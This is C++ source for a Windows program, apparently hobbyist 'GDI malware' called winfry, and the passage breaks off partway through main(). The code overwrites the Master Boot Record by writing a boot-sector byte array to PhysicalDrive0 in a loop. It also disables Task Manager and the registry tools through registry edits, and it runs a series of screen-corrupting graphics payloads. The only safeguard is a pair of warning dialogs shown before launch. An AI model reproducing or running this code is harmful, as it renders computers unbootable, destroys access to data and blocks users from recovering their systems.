//I learned how to use GradientFill :D
#include <windows.h>
#include <tchar.h>
#include <ctime>
#include <iostream>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#define M_PI   3.14159265358979323846264338327950288
//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { //Credits to Void_/GetMBR
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
/*COLORREF RndRGB() {
	int clr = rand() % 5;
	if (clr == 0) return RGB(255, 0, 0); if (clr == 1) return RGB(0, 255, 0); if (clr == 2) return RGB(0, 0, 255); if (clr == 3) return RGB(255, 0, 255); if (clr == 4) return RGB(255, 255, 0);
}*/
const unsigned char MasterBootRecord[] = { 0xb8, 0x13, 0x00, 0xcd, 0x10, 0xb8, 0x00, 0xa0, 0x8e, 0xd8, 0x8e, 0xc0,
  0xfc, 0x31, 0xc9, 0x51, 0xe5, 0x40, 0x50, 0xb4, 0x18, 0x50, 0x50, 0xb1,
  0x04, 0x51, 0x51, 0x89, 0xe5, 0xbb, 0x00, 0xff, 0x88, 0xd8, 0x04, 0x11,
  0x3c, 0x22, 0x72, 0x06, 0x24, 0x0e, 0xb0, 0x00, 0x75, 0x02, 0xb0, 0x80,
  0x88, 0x07, 0x43, 0x75, 0xeb, 0xb1, 0x0c, 0x88, 0x4e, 0x0b, 0xbf, 0x22,
  0xff, 0xb2, 0x0c, 0xe8, 0x7a, 0x01, 0xc6, 0x01, 0x80, 0xe8, 0x74, 0x01,
  0xc6, 0x01, 0xc0, 0x83, 0xc7, 0x10, 0xe2, 0xef, 0xe8, 0x7c, 0x01, 0x80,
  0xe2, 0x1f, 0x75, 0x54, 0xe8, 0x0e, 0x01, 0xe8, 0x43, 0x01, 0x89, 0xd9,
  0xb3, 0x00, 0x80, 0x3f, 0xc0, 0x72, 0x42, 0x39, 0xcb, 0x75, 0x11, 0xc6,
  0x04, 0x0c, 0x83, 0xc6, 0x17, 0x74, 0x99, 0x73, 0xf6, 0x56, 0xe8, 0x56,
  0x01, 0x5e, 0xeb, 0xef, 0x89, 0xdf, 0x88, 0xd8, 0x88, 0xcc, 0xba, 0x0f,
  0x0f, 0x21, 0xc2, 0x31, 0xd0, 0x38, 0xc4, 0x74, 0x08, 0x8d, 0x7f, 0x10,
  0x73, 0x03, 0x8d, 0x7f, 0xf0, 0x38, 0xd6, 0x74, 0x05, 0x4f, 0x72, 0x02,
  0x47, 0x47, 0x80, 0x3d, 0x00, 0x75, 0x06, 0x8a, 0x07, 0xc6, 0x07, 0x00,
  0xaa, 0x43, 0x75, 0xb6, 0xbf, 0x27, 0x00, 0x8d, 0x45, 0xec, 0x03, 0x46,
  0x02, 0xe8, 0xb1, 0x00, 0xe8, 0xd5, 0x00, 0x73, 0xfb, 0xb9, 0x04, 0x12,
  0x74, 0x1f, 0xb5, 0x20, 0x83, 0xff, 0x14, 0x75, 0x18, 0x80, 0x7e, 0x0a,
  0x01, 0x74, 0x12, 0xe8, 0xcf, 0x00, 0xfe, 0x07, 0x80, 0x3f, 0xc3, 0x75,
  0x08, 0xc6, 0x07, 0x00, 0xfe, 0x4e, 0x0b, 0x74, 0x90, 0x8d, 0x45, 0x0c,
  0xe8, 0x8f, 0x00, 0xf7, 0xe6, 0x88, 0xe3, 0x88, 0xd7, 0x43, 0xb8, 0x00,
  0x08, 0x99, 0xf7, 0xf3, 0x3d, 0xc6, 0x00, 0x72, 0x03, 0xb8, 0xc6, 0x00,
  0x89, 0xc6, 0xd3, 0xe8, 0x00, 0xe8, 0x93, 0x57, 0x49, 0xd3, 0xe7, 0xb8,
  0xc8, 0x00, 0x29, 0xf0, 0xd1, 0xe8, 0x50, 0x56, 0x91, 0x8a, 0x46, 0x0a,
  0xe8, 0x98, 0x00, 0x93, 0x59, 0xe8, 0x93, 0x00, 0xb0, 0x03, 0x59, 0xe8,
  0x8d, 0x00, 0x5f, 0x4f, 0x79, 0x89, 0xb4, 0x02, 0xcd, 0x16, 0x8b, 0x5e,
  0x02, 0xa8, 0x04, 0x74, 0x02, 0x4b, 0x4b, 0xa8, 0x08, 0x74, 0x02, 0x43,
  0x43, 0xb4, 0x01, 0xa8, 0x01, 0x74, 0x07, 0xf6, 0xc7, 0x01, 0x75, 0x02,
  0xb4, 0x07, 0x88, 0x66, 0x0a, 0x88, 0xc7, 0x89, 0x5e, 0x02, 0xa8, 0x02,
  0x74, 0x14, 0x93, 0xe8, 0x13, 0x00, 0xe8, 0x37, 0x00, 0x72, 0x0b, 0x83,
  0xfe, 0x04, 0x75, 0xf6, 0x89, 0x56, 0x06, 0x89, 0x5e, 0x04, 0xe9, 0xe7,
  0xfe, 0x31, 0xf6, 0x8b, 0x56, 0x06, 0x50, 0xe8, 0x04, 0x00, 0x91, 0x58,
  0x04, 0x20, 0xa8, 0x40, 0x9c, 0xa8, 0x20, 0x74, 0x02, 0x34, 0x1f, 0x83,
  0xe0, 0x1f, 0xbb, 0xdc, 0x7d, 0x2e, 0xd7, 0x9d, 0x74, 0x02, 0xf7, 0xd8,
  0x8b, 0x5e, 0x04, 0xc3, 0x46, 0x01, 0xca, 0x01, 0xc3, 0x53, 0x51, 0xe8,
  0x07, 0x00, 0x8a, 0x1f, 0xd0, 0xe3, 0x59, 0x5b, 0xc3, 0x88, 0xf3, 0xb1,
  0x04, 0xd2, 0xeb, 0x80, 0xe7, 0xf0, 0x08, 0xfb, 0xb7, 0xff, 0xc3, 0x88,
  0xc4, 0xab, 0xab, 0xab, 0xab, 0x81, 0xc7, 0x38, 0x01, 0xe2, 0xf6, 0xc3,
  0xb0, 0xfb, 0xf6, 0x66, 0x08, 0x04, 0x53, 0x88, 0x46, 0x08, 0xb4, 0x00,
  0xf6, 0xf2, 0x88, 0xe3, 0xb7, 0x00, 0xc3, 0xb4, 0x00, 0xcd, 0x1a, 0x3b,
  0x56, 0x00, 0x74, 0xf7, 0x89, 0x56, 0x00, 0xc3, 0x00, 0x09, 0x16, 0x24,
  0x31, 0x3e, 0x47, 0x53, 0x60, 0x6c, 0x78, 0x80, 0x8b, 0x96, 0xa1, 0xab,
  0xb5, 0xbb, 0xc4, 0xcc, 0xd4, 0xdb, 0xe0, 0xe6, 0xec, 0xf1, 0xf5, 0xf7,
  0xfa, 0xfd, 0xff, 0xff, 0x4f, 0x4f, 0x55, 0xaa
};
DWORD WINAPI mbr(LPVOID lpParam) {
	while (1) {
		DWORD dwBytesWritten;
		HANDLE hDevice = CreateFileW(
			L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
			FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
			OPEN_EXISTING, 0, 0);

		WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
		CloseHandle(hDevice);
	}
}
DWORD WINAPI Disable(LPVOID lpParam) {
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
	return 0;
}

DWORD WINAPI payload1() {
	HDC(__stdcall * v1)(HWND); // ebx
	HDC v2; // ebx
	HDC CompatibleDC; // edi
	HBITMAP CompatibleBitmap; // esi
	HWND hWnd; // [esp+Ch] [ebp-14h]
	int ho; // [esp+10h] [ebp-10h] BYREF
	int cy; // [esp+14h] [ebp-Ch] BYREF
	int i; // [esp+18h] [ebp-8h] BYREF

	v1 = GetDC;
	hWnd = GetDesktopWindow();
	GetDC(0);
	ho = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	for (i = 10; ; i = 999)
	{
		do
		{
			v2 = v1(0);
			CompatibleDC = CreateCompatibleDC(v2);
			CompatibleBitmap = CreateCompatibleBitmap(v2, ho, cy);
			SelectObject(CompatibleDC, CompatibleBitmap);
			BitBlt(CompatibleDC, 0, 0, i, cy, v2, ho - i, 0, 0xCC0020u);
			BitBlt(v2, 0, 0, ho, cy, v2, -i, 0, 0xCC0020u);
			BitBlt(v2, 0, 0, i, cy, CompatibleDC, 0, 0, 0xCC0020u);
			Sleep(5u);
			ReleaseDC(hWnd, v2);
			DeleteDC(v2);
			DeleteDC(CompatibleDC);
			DeleteObject(CompatibleBitmap);
			DeleteObject(&ho);
			DeleteObject(&cy);
			DeleteObject(&i);
			v1 = GetDC;
			++i;
		} while (i < 61);
	}
}
DWORD WINAPI payload2() {
	int v1; // edi
	int v2; // ebx
	int v3; // eax
	HPEN Pen; // eax
	int v5; // eax
	int v6; // [esp-1Ch] [ebp-34h]
	int v7; // [esp-18h] [ebp-30h]
	int v8; // [esp-14h] [ebp-2Ch]
	int v9; // [esp-10h] [ebp-28h]
	int v10; // [esp-Ch] [ebp-24h]
	int v11; // [esp-8h] [ebp-20h]
	int v12; // [esp-4h] [ebp-1Ch]
	int SystemMetrics; // [esp+Ch] [ebp-Ch]
	int v14; // [esp+10h] [ebp-8h]
	HDC hdc; // [esp+14h] [ebp-4h]

	hdc = GetDC(0);
	SystemMetrics = GetSystemMetrics(0);
	v14 = GetSystemMetrics(1);
	while (1)
	{
		v1 = (unsigned __int8)(rand() % 255) << 999;
		v2 = (v1 | (unsigned __int8)(rand() % 255)) << 999;
		v3 = rand();
		Pen = CreatePen(0, 25, v2 | (unsigned __int8)(v3 % 255));
		SelectObject(hdc, Pen);
		v12 = rand() % v14;
		v11 = rand() % SystemMetrics;
		v10 = rand() % v14;
		v9 = rand() % SystemMetrics;
		v8 = rand() % v14;
		v7 = rand() % SystemMetrics;
		v6 = rand() % v14;
		v5 = rand();
		ArcTo(hdc, v5 % SystemMetrics, v6, v7, v8, v9, v10, v11, v12);
		Sleep(2u);
	}
}
DWORD WINAPI payload3() {
	HDC DC; // esi
	int v2; // edi
	int v3; // ecx
	int(__cdecl * v4)(); // ebx
	int v5; // edi
	int v6; // ebx
	int v7; // eax
	HBRUSH SolidBrush; // eax
	int v9; // eax
	int v10; // eax
	int v11; // edi
	int v12; // ebx
	int v13; // eax
	HBRUSH v14; // eax
	int v15; // eax
	int v16; // eax
	int v17; // [esp-1Ch] [ebp-3Ch]
	int v18; // [esp-1Ch] [ebp-3Ch]
	int v19; // [esp-18h] [ebp-38h]
	int v20; // [esp-18h] [ebp-38h]
	int v21; // [esp-14h] [ebp-34h]
	int v22; // [esp-14h] [ebp-34h]
	int v23; // [esp-Ch] [ebp-2Ch]
	int v24; // [esp-Ch] [ebp-2Ch]
	int v25; // [esp-8h] [ebp-28h]
	int v26; // [esp-8h] [ebp-28h]
	int v27; // [esp+Ch] [ebp-14h]
	int v28; // [esp+10h] [ebp-10h]
	int v29; // [esp+14h] [ebp-Ch]
	int SystemMetrics; // [esp+18h] [ebp-8h]
	int cy; // [esp+1Ch] [ebp-4h]

	DC = GetDC(0);
	SystemMetrics = GetSystemMetrics(0);
	v2 = SystemMetrics;
	v3 = GetSystemMetrics(1);
	v4 = rand;
	cy = v3;
	v29 = v3 / 2;
	v28 = SystemMetrics / 2;
	while (1)
	{
		BitBlt(DC, 0, 0, v2, v3, DC, 0, 0, 0x42u);
		v27 = 5;
		do
		{
			v5 = (unsigned __int8)(v4() % 255) << 9;
			v6 = (v5 | (unsigned __int8)(v4() % 255)) << 9;
			v7 = rand();
			SolidBrush = CreateSolidBrush(v6 | (unsigned __int8)(v7 % 255));
			SelectObject(DC, SolidBrush);
			v9 = rand();
			BitBlt(DC, v9 % SystemMetrics, 0, 5, cy, DC, 0, 0, 0x5A0049u);
			--v27;
		} while (v27);
		Sleep(2u);
		v3 = cy;
	}
}
DWORD WINAPI payload4() {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		StretchBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += x + y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI payload5() {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		StretchBlt(hdcMem, 0, 0, 0, 0, 0, w, h, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += x ^ y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI payload6() {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		StretchBlt(hdcMem, 0, 0, 0, 0, 0, 0, 0, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			int t;
			rgbScreen[i].rgb += (i * i) % (RGB(255, 255, 255));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI payload7() {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);


	while (1)
	{
		hdc = GetDC(NULL);
		// Create an array of TRIVERTEX structures that describe
// positional and color values for each vertex.
		TRIVERTEX vertex[3];
		vertex[0].x = rand() % w;
		vertex[0].y = rand() % h;
		vertex[0].Red = 0xb000;
		vertex[0].Green = 0x9000;
		vertex[0].Blue = 0x0000;
		vertex[0].Alpha = 0x0000;

		vertex[1].x = rand() % w;
		vertex[1].y = rand() % h;
		vertex[1].Red = 0x9000;
		vertex[1].Green = 0x0000;
		vertex[1].Blue = 0x9000;
		vertex[1].Alpha = 0x0000;

		vertex[2].x = rand() % w;
		vertex[2].y = rand() % h;
		vertex[2].Red = 0xff00;
		vertex[2].Green = 0xb000;
		vertex[2].Blue = 0x0000;
		vertex[2].Alpha = 0x0000;

		// Create a GRADIENT_TRIANGLE structure that
		// references the TRIVERTEX vertices.
		GRADIENT_TRIANGLE gTriangle;
		gTriangle.Vertex1 = 0;
		gTriangle.Vertex2 = 1;
		gTriangle.Vertex3 = 2;

		// Draw a shaded triangle.
		GradientFill(hdc, vertex, 99, &gTriangle, 1, GRADIENT_FILL_TRIANGLE);
		ReleaseDC(0, hdc);
	}

	return 0x00;
}
DWORD WINAPI payload8() {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		StretchBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].r ^= x ^ y;
			rgbScreen[i].rgb += 360;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		Sleep(10);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI payload9() {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		StretchBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].r += x;
			rgbScreen[i].g += y;
			rgbScreen[i].b += x;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		//Sleep(100);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI payload10() {
	while (1) {
		HDC hdc = GetDC(0);
		int sw = GetSystemMetrics(0);
		int sh = GetSystemMetrics(1);
		SetStretchBltMode(hdc, HALFTONE);
		StretchBlt(hdc, 20, 0, sw, sh + 20, hdc, 0, 0, sw, sh, NOTSRCCOPY);
		StretchBlt(hdc, -30, 0, sw, sh, hdc, 0, 0, sw, sh, NOTSRCCOPY);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI payload11() {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		StretchBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += x ^ 5;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		//Sleep(100);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI payload12() {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			int t;
			rgbScreen[i].rgb = (i * i) % (Hue(239));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI payload13() {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		StretchBlt(hdcMem, 999, 999, w, h, hdcScreen, 0, 0, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			rgbScreen[i].rgb = rand();
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
VOID WINAPI brutalsound() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 48000, 48000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[48000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(1 ^ (t / 0x96) ^ (t / 0x18) ^ (t / 0x9C4) ^ (t * (t / 0x64) / 0x1770) & 0xD2 ^ (t / 0x37) & (t / 5) >> (t / 0x19));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
int main() {
	HANDLE v4; // edi
	HANDLE v5; // edi
	HANDLE v6; // edi
	HANDLE v7; // edi
	HANDLE v8; // esi
	HANDLE v9; // esi
	HANDLE v10; // esi
	HANDLE v11; // esi
	HANDLE v12; // esi
	HANDLE v13; // esi
	HANDLE v14; // edi
	HANDLE v16; // esi
	HANDLE v17; // esi
	HANDLE v18; // esi
	HANDLE v19; // ebx
	HANDLE v20; // edi
	HANDLE v21; // esi
	HANDLE v22; // esi
	HANDLE v23; // esi
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	if (MessageBoxW(NULL, L"Warning!!!\r\n\This software is not recommended to run this on your real machine\r\n\Because this software is not safe to run to your real computer, also\r\n\it can damage your system and overwrite your bootloader or MBR\r\n\(Master boot record) to make your computer unusable and to mulfunction.\r\n\MBR or Master Boot Record is important file to boot up your computer,\r\n\if you overwrite or format it, your computer will be unusable, and\r\n\it will don't bootable again", L"DISCLAIMER: winfry", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Final Warning!!!\r\n\This software is not recommended to run this on your real machine\r\n\Because this software is not safe to run to your real computer, also\r\n\it can damage your system and overwrite your bootloader or MBR\r\n\(Master boot record) to make your computer unusable and to mulfunction.\r\n\MBR or Master Boot Record is important file to boot up your computer,\r\n\if you overwrite or format it, your computer will be unusable, and\r\n\it will don't bootable again\r\n\Also, if you run it, the creator is not responsible for any damages, YOU will be responsible!!!", L"DISCLAIMER", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			v6 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload1, 0, 0, 0);
			v4 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)mbr, 0, 0, 0);
			v5 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Disable, 0, 0, 0);

			Sleep(0x7530u);
			TerminateThread(v6, 0);
			CloseHandle(v6);
			InvalidateRect(0, 0, 0);
			v8 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload2, 0, 0, 0);

			Sleep(0x3A98u);
			TerminateThread(v8, 0);
			CloseHandle(v8);
			InvalidateRect(0, 0, 0);
			v9 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload3, 0, 0, 0);

			Sleep(0x61A8u);
			TerminateThread(v9, 0);
			CloseHandle(v9);
			InvalidateRect(0, 0, 0);
			v10 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload4, 0, 0, 0);

			Sleep(0x61A8u);
			TerminateThread(v10, 0);
			CloseHandle(v10);
			v11 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload5, 0, 0, 0);

			Sleep(0x3A98u);
			TerminateThread(v11, 0);
			CloseHandle(v11);
